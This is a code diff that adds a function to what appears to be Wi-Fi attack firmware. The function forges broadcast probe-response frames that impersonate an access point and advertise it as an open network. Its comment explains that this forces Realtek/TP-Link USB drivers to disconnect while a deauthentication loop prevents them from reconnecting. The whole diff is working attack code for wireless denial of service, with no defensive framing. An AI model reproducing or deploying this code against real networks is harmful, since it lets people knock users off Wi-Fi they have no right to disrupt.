@@ -126,6 +126,32 @@ void wifi_tx_null_frame(void* ap_mac, void* fake_client_mac) {
   wifi_tx_raw_frame(&frame, sizeof(NullDataFrame));
 }
 
+/*
+ * Sends a fake Probe Response with NO security capability bits set.
+ * Realtek/TP-Link USB drivers update the AP's internal profile on receiving
+ * probe responses. Advertising the AP as an open network (no WPA/WPA2/WPA3)
+ * triggers a driver-level disconnect + re-association, during which the main
+ * deauth loop prevents reconnection from succeeding.
+ * Frame size = 38 + ssid_length bytes (same layout as BeaconFrame).
+ */
+void wifi_tx_probe_resp_frame(void* ap_mac, const char* ssid) {
+  static uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+  ProbeRespFrame frame;
+  memcpy(&frame.destination,  broadcast, 6);
+  memcpy(&frame.source,       ap_mac,    6);
+  memcpy(&frame.access_point, ap_mac,    6);
+  uint8_t ssid_len = 0;
+  if (ssid != nullptr) {
+    for (int i = 0; ssid[i] != '\0' && i < 32; i++) {
+      frame.ssid[i] = (uint8_t)ssid[i];
+      ssid_len++;
+    }
+  }
+  frame.ssid_length = ssid_len;
+  // 24 (header) + 8 (timestamp) + 2 (interval) + 2 (capabilities) + 2 (ssid IE header) + ssid_len
+  wifi_tx_raw_frame(&frame, 38 + ssid_len);
+}
+
 void wifi_tx_beacon_frame(void* src_mac, void* dst_mac, const char *ssid) {
   BeaconFrame frame;
   memcpy(&frame.source, src_mac, 6);
